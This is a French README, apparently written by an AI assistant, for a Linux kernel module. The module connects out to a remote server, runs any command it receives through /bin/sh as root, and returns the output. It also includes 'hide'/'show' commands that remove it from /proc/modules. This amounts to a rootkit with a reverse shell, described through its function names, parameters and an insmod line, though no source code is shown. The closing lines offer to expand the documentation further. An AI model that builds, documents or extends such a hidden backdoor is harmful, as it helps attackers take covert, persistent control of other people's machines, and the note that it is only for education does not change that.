# Kernel Remote Command Module

> Ce module noyau se connecte à un serveur TCP distant, reçoit des commandes à exécuter dans l’espace utilisateur (`/bin/sh`) depuis le noyau, capture la sortie, et la renvoie via une connexion TCP.

## 📦 Description

Ce module noyau Linux permet d'établir une connexion TCP sortante vers un serveur distant, d'y recevoir des commandes arbitraires, de les exécuter via `call_usermodehelper()`, et d’en renvoyer le résultat. Il implémente aussi des fonctionnalités de masquage du module (`hide`/`show`) et d’authentification sommaire.

Il est conçu pour des démonstrations en environnement contrôlé à des fins éducatives, notamment autour de la communication noyau-espace utilisateur et de la sécurité.

---

## ⚙️ Paramètres

Les paramètres sont configurables lors de l'insertion du module :

| Nom           | Type    | Description                                     | Valeur par défaut      |
| ------------- | ------- | ----------------------------------------------- | ---------------------- |
| `ip`          | `charp` | Adresse IPv4 du serveur distant                 | `"192.168.100.10"`     |
| `port`        | `int`   | Port TCP du serveur distant                     | `4242`                 |
| `ls_file`     | `charp` | Chemin par défaut pour les commandes `ls`, etc. | `"/"`                  |
| `output_file` | `charp` | Fichier temporaire pour stocker la sortie       | `"/tmp/execls_output"` |

Exemple d’utilisation :

```bash
insmod my_module.ko ip="192.168.0.1" port=4242 ls_file="/home"
```

---

## 📡 Communication

* Établit une connexion TCP vers le serveur défini par `ip` et `port`.
* Envoie les résultats des commandes avec `kernel_sendmsg()`.
* Utilise un thread noyau pour écouter les commandes (`recv_loop`).
* Si la connexion échoue, une reconnexion est tentée automatiquement via `reconnect_to_server()` (implémentation en cours ou à venir selon le code).

---

## 🔐 Authentification

Le module intègre un mécanisme simple d’authentification :

* L'état `authed` permet de contrôler si une machine cliente est autorisée.
* La vérification repose sur une chaîne transmise en clair comparée via `match_key()` (pas de chiffrement dans le code actuel partagé).
* En cas de correspondance, la machine est considérée comme autorisée.

---

## 🧠 Fonctionnalités

### ✅ Commandes implémentées

| Commande          | Description                                                    |
| ----------------- | -------------------------------------------------------------- |
| `hide`            | Supprime le module de la liste `/proc/modules`                 |
| `show`            | Réinsère le module dans la liste des modules visibles          |
| `download <path>` | Envoie le contenu d’un fichier distant (fonctionnalité prévue) |
| `disconnect`      | Ferme la session TCP (implémentation prévue ou à compléter)    |
| `shell`           | Toute commande arbitraire sera exécutée via `/bin/sh -c`       |

---

## 🗂️ Fichiers temporaires

Les sorties des commandes sont redirigées dans un fichier temporaire :

```bash
/tmp/execls_output
```

Ce fichier est ensuite lu dans le noyau avec `filp_open()` et `kernel_read()`.

---

## 🔧 Fonctions clés

| Fonction               | Rôle                                                              |
| ---------------------- | ----------------------------------------------------------------- |
| `exec_shell_command()` | Exécute une commande shell et capture sa sortie                   |
| `send_output()`        | Envoie un buffer vers le serveur distant via TCP                  |
| `read_file_to_buf()`   | Lit un fichier et retourne un buffer contenant son contenu        |
| `match_key()`          | Compare une ligne à une clé attendue                              |
| `hide_module()`        | Masque le module du noyau                                         |
| `show_module()`        | Réaffiche le module du noyau                                      |
| `recv_loop()`          | Boucle d’attente des commandes (non incluse dans le code partagé) |
| `retrive_info()`       | Récupère des informations système à partir de `/proc`             |

---

## ✍️ Exemple de cycle de commande

1. Le serveur distant se connecte au port 4242 du module (le module fait une tentative sortante).
2. Le module reçoit une commande comme `ls /home`.
3. Elle est exécutée via `/bin/sh -c "ls /home > /tmp/execls_output"`.
4. La sortie est lue puis renvoyée au serveur.

---

Si tu souhaites, je peux aussi :

* Te rédiger une section d'installation / désinstallation (`insmod`, `rmmod`, `dmesg`, etc.).
* Générer une version PDF ou Markdown bien formatée.
* Ajouter des exemples de log `printk()` pour le debug.
* Ajouter un diagramme de fonctionnement du module (texte ou image).

Souhaites-tu que je fasse l’un de ces ajouts ?
